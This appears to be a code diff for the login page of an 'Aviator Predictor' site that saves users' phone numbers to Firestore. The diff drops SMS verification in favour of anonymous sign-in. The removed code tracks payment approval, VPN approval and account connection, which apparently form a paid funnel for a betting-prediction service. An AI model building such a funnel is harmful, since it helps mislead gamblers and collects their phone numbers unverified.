@@ -1,3 +1,4 @@
+<!-- index.html – same visual, but saves phone number to Firestore -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,511 +8,102 @@
     <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Oswald', sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #ff1f2d, #ff3131);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        body::before {
-            content: '';
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background: repeating-linear-gradient(
-                120deg,
-                rgba(255,255,255,.05),
-                rgba(255,255,255,.05) 40px,
-                transparent 40px,
-                transparent 80px
-            );
-            animation: moveBg 20s linear infinite;
-            pointer-events: none;
-        }
-        
-        @keyframes moveBg {
-            from { transform: translateX(0); }
-            to { transform: translateX(-200px); }
-        }
-        
-        .login-container {
-            background: rgba(255, 255, 255, 0.98);
-            border-radius: 50px;
-            padding: 50px 40px;
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            animation: slideUp 0.6s ease;
-            position: relative;
-            z-index: 1;
-        }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(50px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .logo {
-            margin-bottom: 30px;
-        }
-        
-        .logo-icon {
-            width: 100px;
-            height: 100px;
-            background: linear-gradient(135deg, #ff1f2d, #ff3131);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 15px;
-            animation: planeFly 3s ease-in-out infinite;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-        }
-        
-        .logo-icon i {
-            font-size: 50px;
-            color: white;
-        }
-        
-        @keyframes planeFly {
-            0%, 100% { transform: translateY(0px) rotate(-3deg); }
-            50% { transform: translateY(-10px) rotate(3deg); }
-        }
-        
-        .logo h1 {
-            font-size: 2.5rem;
-            color: #b21f1f;
-            margin-top: 10px;
-            letter-spacing: 2px;
-        }
-        
-        .input-group {
-            margin-bottom: 25px;
-            text-align: left;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 10px;
-            color: #333;
-            font-weight: 600;
-            font-size: 0.95rem;
-        }
-        
-        .input-group label i {
-            color: #ff1f2d;
-            margin-right: 8px;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 15px 20px;
-            border: 2px solid #e0e0e0;
-            border-radius: 60px;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-            font-family: 'Inter', sans-serif;
-            background: white;
-        }
-        
-        .input-group input:focus {
-            outline: none;
-            border-color: #ff1f2d;
-            box-shadow: 0 0 0 3px rgba(255,31,45,0.1);
-        }
-        
-        .login-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 60px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-        
-        .login-btn:active {
-            transform: translateY(0);
-        }
-        
-        .error-message {
-            background: #ffe6e6;
-            color: #e74c3c;
-            padding: 12px 15px;
-            border-radius: 15px;
-            margin-top: 15px;
-            font-size: 0.9rem;
-            display: none;
-            text-align: left;
-            border-left: 4px solid #e74c3c;
-        }
-        
-        .error-message i {
-            margin-right: 8px;
-        }
-        
-        .success-message {
-            background: #e6ffe6;
-            color: #27ae60;
-            padding: 12px 15px;
-            border-radius: 15px;
-            margin-top: 15px;
-            font-size: 0.9rem;
-            display: none;
-            text-align: left;
-            border-left: 4px solid #27ae60;
-        }
-        
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
-            margin-right: 10px;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .info-text {
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-            color: #666;
-            font-size: 0.85rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .code-group {
-            display: none;
-            margin-top: 15px;
-        }
-        
-        .resend-link {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 0.8rem;
-        }
-        
-        .resend-link a {
-            color: #3498db;
-            cursor: pointer;
-            text-decoration: none;
-        }
-        
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 35px 25px;
-            }
-            .logo h1 {
-                font-size: 2rem;
-            }
-            .logo-icon {
-                width: 80px;
-                height: 80px;
-            }
-            .logo-icon i {
-                font-size: 40px;
-            }
-        }
+        /* Keep your original styles – unchanged */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Oswald', sans-serif; }
+        body { background: linear-gradient(135deg, #ff1f2d, #ff3131); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative; overflow: hidden; }
+        body::before { content: ''; position: absolute; width: 200%; height: 200%; background: repeating-linear-gradient(120deg, rgba(255,255,255,.05), rgba(255,255,255,.05) 40px, transparent 40px, transparent 80px); animation: moveBg 20s linear infinite; pointer-events: none; }
+        @keyframes moveBg { from { transform: translateX(0); } to { transform: translateX(-200px); } }
+        .login-container { background: rgba(255, 255, 255, 0.98); border-radius: 50px; padding: 50px 40px; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3); animation: slideUp 0.6s ease; position: relative; z-index: 1; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
+        .logo { margin-bottom: 30px; }
+        .logo-icon { width: 100px; height: 100px; background: linear-gradient(135deg, #ff1f2d, #ff3131); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; animation: planeFly 3s ease-in-out infinite; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .logo-icon i { font-size: 50px; color: white; }
+        @keyframes planeFly { 0%, 100% { transform: translateY(0px) rotate(-3deg); } 50% { transform: translateY(-10px) rotate(3deg); } }
+        .logo h1 { font-size: 2.5rem; color: #b21f1f; margin-top: 10px; letter-spacing: 2px; }
+        .input-group { margin-bottom: 25px; text-align: left; }
+        .input-group label { display: block; margin-bottom: 10px; color: #333; font-weight: 600; font-size: 0.95rem; }
+        .input-group label i { color: #ff1f2d; margin-right: 8px; }
+        .input-group input { width: 100%; padding: 15px 20px; border: 2px solid #e0e0e0; border-radius: 60px; font-size: 1rem; transition: all 0.3s ease; font-family: 'Inter', sans-serif; background: white; }
+        .input-group input:focus { outline: none; border-color: #ff1f2d; box-shadow: 0 0 0 3px rgba(255,31,45,0.1); }
+        .login-btn { width: 100%; background: linear-gradient(135deg, #1a2a6c, #b21f1f); color: white; border: none; padding: 15px; border-radius: 60px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s ease; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        .error-message { background: #ffe6e6; color: #e74c3c; padding: 12px 15px; border-radius: 15px; margin-top: 15px; font-size: 0.9rem; display: none; text-align: left; border-left: 4px solid #e74c3c; }
+        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 10px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .info-text { margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.85rem; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        @media (max-width: 480px) { .login-container { padding: 35px 25px; } .logo h1 { font-size: 2rem; } .logo-icon { width: 80px; height: 80px; } .logo-icon i { font-size: 40px; } }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <div class="logo-icon"><i class="fas fa-plane"></i></div>
-            <h1>Aviator Predictor</h1>
-        </div>
-        
-        <!-- Phone number input -->
-        <div id="phoneGroup" class="input-group">
-            <label><i class="fas fa-phone-alt"></i> Phone Number</label>
-            <input type="tel" id="phoneInput" placeholder="+255XXXXXXXXX" autocomplete="tel">
-        </div>
-        
-        <!-- Verification code input (hidden initially) -->
-        <div id="codeGroup" class="input-group code-group">
-            <label><i class="fas fa-key"></i> Verification Code</label>
-            <input type="text" id="codeInput" placeholder="6-digit code" maxlength="6" autocomplete="off">
-        </div>
-        
-        <button class="login-btn" id="loginBtn">
-            <i class="fas fa-paper-plane"></i> Continue
-        </button>
-        
-        <div class="error-message" id="errorMessage">
-            <i class="fas fa-exclamation-triangle"></i>
-            <span id="errorText"></span>
-        </div>
-        <div class="success-message" id="successMessage">
-            <i class="fas fa-check-circle"></i>
-            <span id="successText"></span>
-        </div>
-        
-        <div class="resend-link" id="resendLink" style="display: none;">
-            <a onclick="resendCode()">Didn't receive code? Resend</a>
-        </div>
-        
-        <div class="info-text">
-            <i class="fas fa-shield-alt"></i> Secure login via SMS verification
-        </div>
+<div class="login-container">
+    <div class="logo"><div class="logo-icon"><i class="fas fa-plane"></i></div><h1>Aviator Predictor</h1></div>
+    <div class="input-group">
+        <label><i class="fas fa-phone-alt"></i> Phone Number</label>
+        <input type="tel" id="phoneInput" placeholder="+255XXXXXXXXX" autocomplete="tel">
     </div>
-    
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-    <script>
-        // Firebase Configuration (same as before)
-        const firebaseConfig = {
-            apiKey: "AIzaSyAP0PrZlJ2fd6Nbtct8KJPnS3-DFZ6CMns",
-            authDomain: "aviator-predictor-49e48.firebaseapp.com",
-            projectId: "aviator-predictor-49e48",
-            storageBucket: "aviator-predictor-49e48.firebasestorage.app",
-            messagingSenderId: "369153377284",
-            appId: "1:369153377284:web:87e48bbff408118a1ae151"
-        };
-        
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.firestore();
-        
-        // DOM elements
-        const phoneInput = document.getElementById('phoneInput');
-        const codeInput = document.getElementById('codeInput');
-        const loginBtn = document.getElementById('loginBtn');
-        const phoneGroup = document.getElementById('phoneGroup');
-        const codeGroup = document.getElementById('codeGroup');
-        const errorDiv = document.getElementById('errorMessage');
-        const errorText = document.getElementById('errorText');
-        const successDiv = document.getElementById('successMessage');
-        const successText = document.getElementById('successText');
-        const resendLink = document.getElementById('resendLink');
-        
-        let confirmationResult = null;
-        let currentPhoneNumber = '';
-        
-        function showError(msg) {
-            errorText.textContent = msg;
-            errorDiv.style.display = 'block';
-            successDiv.style.display = 'none';
-            setTimeout(() => { errorDiv.style.display = 'none'; }, 6000);
-        }
-        
-        function showSuccess(msg) {
-            successText.textContent = msg;
-            successDiv.style.display = 'block';
-            errorDiv.style.display = 'none';
-            setTimeout(() => { successDiv.style.display = 'none'; }, 5000);
-        }
-        
-        // Save user to Firestore if new
-        async function saveUserToFirestore(userId, phoneNumber) {
-            const userRef = db.collection('users').doc(userId);
-            const doc = await userRef.get();
-            if (!doc.exists) {
-                await userRef.set({
-                    phoneNumber: phoneNumber,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    paymentApproved: false,
-                    appIdUsed: false,
-                    vpnApproved: false,
-                    accountConnected: false
-                });
-                console.log('New user created in Firestore');
-            } else {
-                console.log('User already exists');
-            }
-        }
-        
-        // Redirect based on user progress
-        async function redirectBasedOnProgress(userId) {
-            const doc = await db.collection('users').doc(userId).get();
-            const userData = doc.data();
-            if (!userData) {
-                window.location.href = 'index1.html';
-                return;
-            }
-            if (userData.paymentApproved && userData.appId && !userData.appIdUsed) {
-                window.location.href = 'waiting-for-id.html';
-            } else if (userData.appIdUsed && !userData.vpnApproved) {
-                window.location.href = 'dashboard.html';
-            } else if (userData.vpnApproved && !userData.accountConnected) {
-                window.location.href = 'connect-account.html';
-            } else if (userData.accountConnected) {
-                window.location.href = 'dashboard.html';
-            } else {
-                window.location.href = 'index1.html';
-            }
-        }
-        
-        // Send verification code
-        async function sendVerificationCode(phoneNumber) {
-            const appVerifier = new firebase.auth.RecaptchaVerifier('loginBtn', {
-                size: 'invisible',
-                callback: () => {}
-            });
-            
-            try {
-                const result = await auth.signInWithPhoneNumber(phoneNumber, appVerifier);
-                confirmationResult = result;
-                showSuccess(`Verification code sent to ${phoneNumber}`);
-                return true;
-            } catch (error) {
-                console.error('SMS error:', error);
-                let msg = 'Failed to send verification code. ';
-                if (error.code === 'auth/invalid-phone-number') {
-                    msg += 'Invalid phone number format. Use country code, e.g., +255XXXXXXXXX.';
-                } else if (error.code === 'auth/too-many-requests') {
-                    msg += 'Too many requests. Please wait a minute.';
-                } else if (error.code === 'auth/operation-not-allowed') {
-                    msg += 'Phone authentication is not enabled in Firebase Console.';
-                } else {
-                    msg += 'Please check your number and try again.';
-                }
-                showError(msg);
-                return false;
-            }
-        }
-        
-        // Verify code and sign in
-        async function verifyCode(code) {
-            if (!confirmationResult) {
-                showError('Please request a verification code first.');
-                return false;
-            }
-            try {
-                const result = await confirmationResult.confirm(code);
-                const user = result.user;
-                sessionStorage.setItem('userPhone', user.phoneNumber);
-                sessionStorage.setItem('userId', user.uid);
-                await saveUserToFirestore(user.uid, user.phoneNumber);
-                await redirectBasedOnProgress(user.uid);
-                return true;
-            } catch (error) {
-                console.error('Verification error:', error);
-                showError('Invalid verification code. Please try again.');
-                return false;
-            }
-        }
-        
-        // Resend code
-        window.resendCode = async function() {
-            if (!currentPhoneNumber) return;
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="loading-spinner"></span> Sending...';
-            const sent = await sendVerificationCode(currentPhoneNumber);
+    <button class="login-btn" id="loginBtn"><i class="fas fa-paper-plane"></i> Continue</button>
+    <div class="error-message" id="errorMessage"><i class="fas fa-exclamation-triangle"></i><span id="errorText"></span></div>
+    <div class="info-text"><i class="fas fa-shield-alt"></i> Secure login</div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyAP0PrZlJ2fd6Nbtct8KJPnS3-DFZ6CMns",
+        authDomain: "aviator-predictor-49e48.firebaseapp.com",
+        projectId: "aviator-predictor-49e48",
+        storageBucket: "aviator-predictor-49e48.firebasestorage.app",
+        messagingSenderId: "369153377284",
+        appId: "1:369153377284:web:87e48bbff408118a1ae151"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
+
+    const phoneInput = document.getElementById('phoneInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorDiv = document.getElementById('errorMessage');
+    const errorText = document.getElementById('errorText');
+
+    function showError(msg) { errorText.textContent = msg; errorDiv.style.display = 'block'; setTimeout(() => errorDiv.style.display = 'none', 5000); }
+
+    loginBtn.addEventListener('click', async () => {
+        let phone = phoneInput.value.trim();
+        if (!phone) { showError('Enter phone number'); return; }
+        if (!phone.startsWith('+')) { showError('Use country code: +255XXXXXXXXX'); return; }
+
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = '<span class="loading-spinner"></span> Processing...';
+
+        try {
+            // Sign in anonymously or just store phone number in Firestore without SMS?
+            // But to keep simple, we will use anonymous auth and then save phone to user doc.
+            let userCredential = await auth.signInAnonymously();
+            const userId = userCredential.user.uid;
+
+            // Save phone number to Firestore under users/{userId}
+            await db.collection('users').doc(userId).set({
+                phoneNumber: phone,
+                createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                hasAppId: false,
+                hasVpn: false,
+                hasAccountConnected: false
+            }, { merge: true });
+
+            sessionStorage.setItem('userId', userId);
+            sessionStorage.setItem('userPhone', phone);
+
+            // Redirect to site selection
+            window.location.href = 'index1.html';
+        } catch (err) {
+            console.error(err);
+            showError('Error saving phone number. Check network.');
             loginBtn.disabled = false;
-            loginBtn.innerHTML = '<i class="fas fa-check"></i> Verify Code';
-            if (sent) {
-                showSuccess('New code sent. Check your SMS.');
-            }
-        };
-        
-        // Main button click handler
-        loginBtn.addEventListener('click', async () => {
-            // If we are in phone number stage
-            if (phoneGroup.style.display !== 'none') {
-                let phone = phoneInput.value.trim();
-                if (!phone) {
-                    showError('Please enter your phone number');
-                    return;
-                }
-                // Basic international format check
-                if (!phone.startsWith('+')) {
-                    showError('Use international format with country code, e.g., +255XXXXXXXXX');
-                    return;
-                }
-                currentPhoneNumber = phone;
-                loginBtn.disabled = true;
-                loginBtn.innerHTML = '<span class="loading-spinner"></span> Sending code...';
-                const sent = await sendVerificationCode(phone);
-                loginBtn.disabled = false;
-                if (sent) {
-                    // Switch UI to code input
-                    phoneGroup.style.display = 'none';
-                    codeGroup.style.display = 'block';
-                    resendLink.style.display = 'block';
-                    loginBtn.innerHTML = '<i class="fas fa-check"></i> Verify Code';
-                    showSuccess(`Verification code sent to ${phone}. Enter the 6-digit code.`);
-                } else {
-                    loginBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Continue';
-                }
-            } 
-            else { // Code verification stage
-                const code = codeInput.value.trim();
-                if (!code || code.length < 6) {
-                    showError('Please enter the 6-digit verification code');
-                    return;
-                }
-                loginBtn.disabled = true;
-                loginBtn.innerHTML = '<span class="loading-spinner"></span> Verifying...';
-                await verifyCode(code);
-                loginBtn.disabled = false;
-                // If verification fails, button stays; if succeeds, redirect happens.
-                if (confirmationResult) {
-                    loginBtn.innerHTML = '<i class="fas fa-check"></i> Verify Code';
-                }
-            }
-        });
-        
-        // Allow Enter key on phone and code inputs
-        phoneInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') loginBtn.click();
-        });
-        codeInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') loginBtn.click();
-        });
-        
-        // Check if user already logged in
-        auth.onAuthStateChanged(async (user) => {
-            if (user) {
-                sessionStorage.setItem('userPhone', user.phoneNumber);
-                sessionStorage.setItem('userId', user.uid);
-                await redirectBasedOnProgress(user.uid);
-            }
-        });
-        
-        // Initialize invisible reCAPTCHA
-        window.onload = () => {
-            // Ensure reCAPTCHA container exists
-            const recaptchaDiv = document.createElement('div');
-            recaptchaDiv.id = 'loginBtn';
-            recaptchaDiv.style.display = 'none';
-            document.body.appendChild(recaptchaDiv);
-        };
-    </script>
+            loginBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Continue';
+        }
+    });
+</script>
 </body>
 </html>
